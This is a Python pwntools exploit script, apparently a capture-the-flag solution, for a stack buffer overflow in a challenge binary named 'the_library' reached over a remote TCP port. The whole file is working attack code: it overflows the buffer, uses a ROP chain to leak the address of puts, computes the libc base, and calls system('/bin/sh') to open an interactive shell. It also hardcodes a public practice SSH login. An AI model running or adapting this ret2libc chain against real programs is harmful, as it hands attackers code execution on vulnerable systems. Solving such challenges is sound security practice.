from pwn import ELF, process, ROP, remote, ssh, gdb, cyclic, cyclic_find, log, p64, u64  # Import pwntools
####################
#### CONNECTION ####
####################
LOCAL = False
REMOTETTCP = True
REMOTESSH = False
GDB = False

LOCAL_BIN = './the_library_patched'
REMOTE_BIN = '~/vuln' #For ssh
LIBC = ELF('./libc.so.6') #Set library path when know it

if LOCAL:
    P = process(LOCAL_BIN) # start the vuln binary
    ELF_LOADED = ELF(LOCAL_BIN)# Extract data from binary
    ROP_LOADED = ROP(ELF_LOADED)# Find ROP gadgets

elif REMOTETTCP:
    P = remote('challenge.ctf.games',31125) # start the vuln binary
    ELF_LOADED = ELF(LOCAL_BIN)# Extract data from binary
    ROP_LOADED = ROP(ELF_LOADED)# Find ROP gadgets

elif REMOTESSH:
    ssh_shell = ssh('bandit0', 'bandit.labs.overthewire.org', password='bandit0', port=2220)
    p = ssh_shell.process(REMOTE_BIN) # start the vuln binary
    elf = ELF(LOCAL_BIN)# Extract data from binary
    rop = ROP(elf)# Find ROP gadgets

if GDB and not REMOTETTCP and not REMOTESSH:
    # attach gdb and continue
    # You can set breakpoints, for example 'break *main'
    gdb.attach(P.pid, 'b *main')



##########################
##### OFFSET FINDER ######
##########################

OFFSET = b'A'*0x228



#####################
#### Find Gadgets ###
#####################
try:
    libc_func = 'puts'
    PUTS_PLT = ELF_LOADED.plt['puts'] #PUTS_PLT = ELF_LOADED.symbols['puts'] # This is also valid to call puts
except:
    libc_func = 'printf'
    PUTS_PLT = ELF_LOADED.plt['printf']

MAIN_PLT = ELF_LOADED.symbols['main']
POP_RDI = (ROP_LOADED.find_gadget(['pop rdi', 'ret']))[0] #Same as ROPgadget --binary vuln | grep 'pop rdi'
RET = (ROP_LOADED.find_gadget(['ret']))[0]

log.info('Main start: ' + hex(MAIN_PLT))
log.info('Puts plt: ' + hex(PUTS_PLT))
log.info('pop rdi; ret  gadget: ' + hex(POP_RDI))
log.info('ret gadget: ' + hex(RET))


#########################
#### Finf LIBC offset ###
#########################

def get_addr(libc_func):
    FUNC_GOT = ELF_LOADED.got[libc_func]
    log.info(libc_func + ' GOT @ ' + hex(FUNC_GOT))
    rop1 = OFFSET + p64(POP_RDI) + p64(FUNC_GOT) + p64(PUTS_PLT) + p64(MAIN_PLT)

    # Send our rop-chain payload
    #P.sendlineafter('dah?', rop1) #Use this to send the payload when something is received
    P.sendlineafter(b'>',rop1)
    P.recvline()
    # If binary is echoing back the payload, remove that message
    recieved = P.recvline().strip()
    leak = u64(recieved.ljust(8, b'\x00'))
    log.info(f'Leaked LIBC address,  {libc_func}: {hex(leak)}')
    
    # Set lib base address
    if LIBC:
        LIBC.address = leak - LIBC.symbols[libc_func] #Save LIBC base
        log.info('LIBC base @ %s' % hex(LIBC.address))

    # If not LIBC yet, stop here
    else:
        print('TO CONTINUE) Find the LIBC library and continue with the exploit... (https://LIBC.blukat.me/)')
        P.interactive()
    
    return hex(leak)

get_addr(libc_func) #Search for puts address in memmory to obtain LIBC base



##############################
##### FINAL EXPLOITATION #####
##############################

BINSH = next(LIBC.search(b'/bin/sh')) #Verify with find /bin/sh
SYSTEM = LIBC.sym['system']
EXIT = LIBC.sym['exit']

log.info('POP_RDI %s ' % hex(POP_RDI))
log.info('bin/sh %s ' % hex(BINSH))
log.info('system %s ' % hex(SYSTEM))
log.info('exit %s ' % hex(EXIT))

rop2 = OFFSET + p64(RET) + p64(POP_RDI) + p64(BINSH) + p64(SYSTEM)


P.sendlineafter(b'>',rop2)
P.interactive() #Interact with your shell :)
